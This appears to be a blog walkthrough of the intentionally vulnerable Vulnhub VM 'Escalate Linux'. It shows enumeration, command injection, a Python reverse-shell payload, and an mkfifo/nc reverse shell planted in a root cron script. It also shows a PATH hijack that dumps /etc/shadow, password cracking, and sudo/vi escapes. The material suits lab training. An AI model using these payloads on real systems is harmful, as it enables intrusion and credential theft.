<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="ESCALATE LINUX - Vulnhub Walkthrough" /><meta property="og:locale" content="en_US" /><meta name="description" content="Description" /><meta property="og:description" content="Description" /><link rel="canonical" href="http://maaelhamid.github.io/posts/ESCALATE-LINUX/" /><meta property="og:url" content="http://maaelhamid.github.io/posts/ESCALATE-LINUX/" /><meta property="og:site_name" content="Mohamed Ayman" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-12T05:35:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="ESCALATE LINUX - Vulnhub Walkthrough" /><meta name="twitter:site" content="@MAAelHamid" /><meta name="google-site-verification" content="google-site-verification" /> <script type="application/ld+json"> {"description":"Description","headline":"ESCALATE LINUX - Vulnhub Walkthrough","url":"http://maaelhamid.github.io/posts/ESCALATE-LINUX/","@type":"BlogPosting","dateModified":"2021-08-14T16:36:36+02:00","datePublished":"2021-08-12T05:35:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://maaelhamid.github.io/posts/ESCALATE-LINUX/"},"@context":"https://schema.org"}</script><title>ESCALATE LINUX - Vulnhub Walkthrough | Mohamed Ayman</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mohamed Ayman"><meta name="application-name" content="Mohamed Ayman"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://maaelhamid.github.io/assets/img/profile/av.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mohamed Ayman</a></div><div class="site-subtitle font-italic">Offensive Security Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/MAAelHamid" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/MAAelHamid" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['m.a.a.elhamid','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>ESCALATE LINUX - Vulnhub Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>ESCALATE LINUX - Vulnhub Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Mohamed Ayman </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Aug 12, 2021, 5:35 AM +0200" prep="on" > Aug 12 <i class="unloaded">2021-08-12T05:35:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 14, 2021, 4:36 PM +0200" prefix="Updated " > Aug 14 <i class="unloaded">2021-08-14T16:36:36+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1235 words">6 min</span></div></div><div class="post-content"><h1 id="description">Description</h1><p>Escalate_Linux - A intentionally developed Linux vulnerable virtual machine.The main focus of this machine is to learn Linux Post Exploitation (Privilege Escalation) Techniques.</p><h1 id="init">INIT</h1><p>identify target IP</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">➜  ~ nmap -sP 172.16.129.128/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 10:26 EDT
Nmap scan report for Home (172.16.129.1)
Host is up (0.0010s latency).
Nmap scan report for 172.16.129.2
Host is up (0.00088s latency).
Nmap scan report for 172.16.129.128
Host is up (0.00069s latency).
Nmap scan report for 172.16.129.139
Host is up (0.0034s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.73 seconds

</span></pre></table></code></div></div><p>edit <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file (local DNS)</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Vulnhub
<span class="go">172.16.129.139  Esclinux.vuln
</span></pre></table></code></div></div><p>lets starting …</p><h1 id="scanning">Scanning</h1><h3 id="nmap">Nmap</h3><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre><span class="go">➜  ~ sudo nmap -A -p- -T4 Esclinux.vuln 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 10:27 EDT
Nmap scan report for Esclinux.vuln (172.16.129.139)
Host is up (0.0011s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
</span><span class="gp">111/tcp   open  rpcbind     2-4 (RPC #</span>100000<span class="o">)</span>
<span class="go">| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34511/udp   mountd
|   100005  1,2,3      50751/tcp   mountd
|   100005  1,2,3      55807/tcp6  mountd
|   100005  1,2,3      57755/udp6  mountd
|   100021  1,3,4      38135/tcp   nlockmgr
|   100021  1,3,4      38777/tcp6  nlockmgr
|   100021  1,3,4      54049/udp   nlockmgr
|   100021  1,3,4      60507/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
</span><span class="gp">2049/tcp  open  nfs_acl     3 (RPC #</span>100227<span class="o">)</span>
<span class="gp">38135/tcp open  nlockmgr    1-4 (RPC #</span>100021<span class="o">)</span>
<span class="gp">41879/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="gp">50079/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="gp">50751/tcp open  mountd      1-3 (RPC #</span>100005<span class="o">)</span>
<span class="go">MAC Address: 00:0C:29:9F:EB:8D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: LINUX

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
</span><span class="gp">|_nbstat: NetBIOS name: LINUX, NetBIOS user: &lt;unknown&gt;</span>, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
<span class="go">| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: osboxes
|   NetBIOS computer name: LINUX\x00
|   Domain name: \x00
|   FQDN: osboxes
|_  System time: 2021-08-12T10:27:39-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-12T14:27:39
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   1.07 ms Esclinux.vuln (172.16.129.139)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.98 seconds
</span></pre></table></code></div></div><h1 id="enumeration">Enumeration</h1><p><strong>port 80</strong> is opened let’s take a look</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812163546456.png" alt="image-20210812163546456" /></p><p>default page …</p><p><strong>Wappalyzer</strong></p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812164054749.png" alt="image-20210812164054749" /></p><p><strong>Check directory</strong></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="go">➜  ~ gobuster dir -u http://esclinux.vuln -w ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://esclinux.vuln
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/x/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/12 10:40:21 Starting gobuster in directory enumeration mode
===============================================================
/shell.php            (Status: 200) [Size: 29]
                                              
===============================================================
2021/08/12 10:40:21 Finished
===============================================================
</span></pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">/shell.php</code> directory</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812165000846.png" alt="image-20210812165000846" /></p><p>let pass this var with <code class="language-plaintext highlighter-rouge">ifconfig</code> command</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812165108427.png" alt="image-20210812165108427" /></p><p>it works … <em>this vulnerability called command injection</em></p><h1 id="exploiting">Exploiting</h1><p>sending reverse shell</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">python -c 'import socket,subprocess,os;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"172.16.129.128"</span>,1234<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span><span class="s1">'ip
</span></pre></table></code></div></div><p>set listening port</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">➜  ~ nc -nlvp 1234
</span></pre></table></code></div></div><p>GET request</p><div lang="http" class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">http://esclinux.vuln/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22172.16.129.128%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27ip
</span></pre></table></code></div></div><p>We get SHELL</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">➜  ~ nc -nlvp 1234
listening on [any] 1234 ...

connect to [172.16.129.128] from (UNKNOWN) [172.16.129.139] 59640
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">user6
</span></pre></table></code></div></div><p>spawn shell</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s2">"__import__('pty').spawn('/bin/bash')"</span>
<span class="go">Welcome to Linux Lite 4.4 
 
Thursday 12 August 2021, 11:11:45
Memory Usage: 343/985MB (34.82%)
Disk Usage: 5/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
 user6  / | var | www | html  
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Regular User Account Access</ul><h1 id="privilege-escalation">Privilege Escalation</h1><p>you can run Linux Privilege Escalation Awesome Script - <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a> for fast enumeration</p><p>here we go for manual way …</p><h2 id="01-suid-rights-exploit">#01 SUID rights Exploit</h2><p>execute this command <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null </code> searching for “sticky bits”</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812175411254.png" alt="image-20210812175411254" /></p><p>run the shell</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812175221951.png" alt="image-20210812175221951" /></p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Root User Account Access</ul><h2 id="02-cracking-the-root-password-path-variable">#02 Cracking the root password “PATH Variable”</h2><p>as we notice that running <code class="language-plaintext highlighter-rouge">/home/user5/script</code></p><p>trigger <code class="language-plaintext highlighter-rouge">ls</code> command</p><p>let’s abuse this <em>remember this exploit run because sticky bit -run as root-</em></p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">cd /tmp
</span><span class="gp">echo "cat /etc/shadow" &gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">chmod 777 ls
</span><span class="gp">export PATH=/tmp:$</span>PATH
<span class="go">cd /home/user5
./script
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812181317964.png" alt="image-20210812181317964" /></p><p>copy root shadow to attacker machine in text file called shadow</p><p>using john the ripper to crack password</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">➜  ~ john shadow  
Using default input encoding: UTF-8
</span><span class="gp">Loaded 1 password hash (sha512crypt, crypt(3) $</span>6<span class="nv">$ </span><span class="o">[</span>SHA512 256/256 AVX2 4x]<span class="o">)</span>
<span class="go">Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
12345            (?)
1g 0:00:00:00 DONE 2/3 (2021-08-12 12:31) 10.00g/s 2560p/s 2560c/s 2560C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</span></pre></table></code></div></div><p>password is <strong>12345</strong></p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812183447230.png" alt="image-20210812183447230" /></p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Root User Account Access</ul><h2 id="03-root-shell-by-exploiting-sudo-rights-of-user1">#03 Root shell by exploiting SUDO rights of user1</h2><p>if all password hard to crack we can change</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">echo 'echo "user1:12345" | chpasswd' &gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">chmod 777 ls
</span><span class="gp">export PATH=/tmp:$</span>PATH
<span class="go">cd /home/user5
./script
su user1
sudo –l
sudo su
</span></pre></table></code></div></div><p>Credentials : <code class="language-plaintext highlighter-rouge">user1:12345</code></p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812184549446.png" alt="image-20210812184549446" /></p><p><code class="language-plaintext highlighter-rouge">sudo -l</code> to list privilege of user</p><p>wait !! user1 can sudo all things with no password</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812184932975.png" alt="image-20210812184932975" /></p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Root User Account Access</ul><h2 id="04--reverse-root-shell-by-exploiting-crontab">#04 Reverse Root shell by exploiting crontab</h2><p><code class="language-plaintext highlighter-rouge">cat /etc/crontab</code> to see scheduled tasks</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812185432059.png" alt="image-20210812185432059" /></p><p>remember we have root access 3 ways above</p><p>lets create reverse shell</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>attacker machine
<span class="go">➜  ~ msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.2.17 LPORT=443 -f raw
</span><span class="gp">mkfifo /tmp/znaiyl;</span><span class="w"> </span>172.16.129.128 4444 0&lt;/tmp/znaiyl | /bin/sh <span class="o">&gt;</span>/tmp/znaiyl 2&gt;&amp;1<span class="p">;</span> <span class="nb">rm</span> /tmp/znaiyl
<span class="go">➜  ~ nc -nlvp 4444
</span></pre></table></code></div></div><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp"> #</span><span class="w"> </span>target shell
<span class="gp"> echo 'mkfifo /tmp/bxyrmrg;</span><span class="w"> </span>nc 172.16.129.128 4444 0&lt;/tmp/bxyrmrg | /bin/sh <span class="o">&gt;</span>/tmp/bxyrmrg 2&gt;&amp;1<span class="p">;</span> <span class="nb">rm</span> /tmp/bxyrmrg<span class="s1">' &gt;&gt; autoscript.sh
</span></pre></table></code></div></div><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />now we have reverse shell with root privilege</ul><h2 id="05-exploiting-sudo-rights-of-vi-editor">#05 Exploiting SUDO rights of vi editor</h2><p>We changed the password of all the users to 12345 using the same methodology as above and switched between users to check for more exploits. We found that user8 has a sudo permission for vi editors.</p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812192221813.png" alt="image-20210812192221813" /></p><p>run <code class="language-plaintext highlighter-rouge">sudo vi</code></p><p>enter this in vi</p><div lang="console" class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">:!sh
ids
</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812192940487.png" alt="image-20210812192940487" /></p><p><img data-proofer-ignore data-src="/assets/2021-08-12-ESCALATE-LINUX/image-20210812193023386.png" alt="image-20210812193023386" /></p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Root User Account Access</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vlunhub/'>VlunHub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/escalate-linux/" class="post-tag no-text-decoration" >ESCALATE_LINUX</a> <a href="/tags/privilege-escalation/" class="post-tag no-text-decoration" >privilege_escalation</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >SUID</a> <a href="/tags/path-var/" class="post-tag no-text-decoration" >PATH_var</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >SUDO</a> <a href="/tags/crontab/" class="post-tag no-text-decoration" >crontab</a> <a href="/tags/vi-sudo/" class="post-tag no-text-decoration" >vi_sudo</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=ESCALATE LINUX - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/ESCALATE-LINUX/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=ESCALATE LINUX - Vulnhub Walkthrough - Mohamed Ayman&u=http://maaelhamid.github.io/posts/ESCALATE-LINUX/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=ESCALATE LINUX - Vulnhub Walkthrough - Mohamed Ayman&url=http://maaelhamid.github.io/posts/ESCALATE-LINUX/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Bypass-30X-redirect-with-BurpSuite/">Bypass 30X redirect with BurpSuite</a><li><a href="/posts/TOPPO/">TOPPO - Vulnhub Walkthrough</a><li><a href="/posts/ESCALATE-LINUX/">ESCALATE LINUX - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1/">KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough</a><li><a href="/posts/KIOPTRIX_LEVEL_1.1/">KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/30x/">30x</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/NULLBYTE/"><div class="card-body"> <span class="timeago small" > Aug 13 <i class="unloaded">2021-08-13T10:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NULLBYTE - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Description Codename: NB0x01 Download: ly0n.me/nullbyte/NullByte.ova.zip Objetcive: Get to /root/proof.txt and follow the instructions. Level: Basic to intermediate. Description: Boot2root, box...</p></div></div></a></div><div class="card"> <a href="/posts/TOPPO/"><div class="card-body"> <span class="timeago small" > Aug 14 <i class="unloaded">2021-08-14T05:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TOPPO - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Description The Machine isn’t hard to own and don’t require advanced exploitation . INIT identify target IP 1 2 3 4 5 6 7 8 9 10 11 12 ➜ ~ nmap -sP 172.16.129.128/24 Starting Nmap 7.91 ( https...</p></div></div></a></div><div class="card"> <a href="/posts/ESCALATE-MY-PRIVILEGES/"><div class="card-body"> <span class="timeago small" > Aug 13 <i class="unloaded">2021-08-13T05:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ESCALATE MY PRIVILEGES - Vulnhub Walkthrough</h3><div class="text-muted small"><p> INIT identify target IP 1 2 3 4 5 6 7 8 9 10 11 ➜ ~ nmap -sP 172.16.129.128/24 Starting Nmap 7.91 ( https://nmap.org ) at 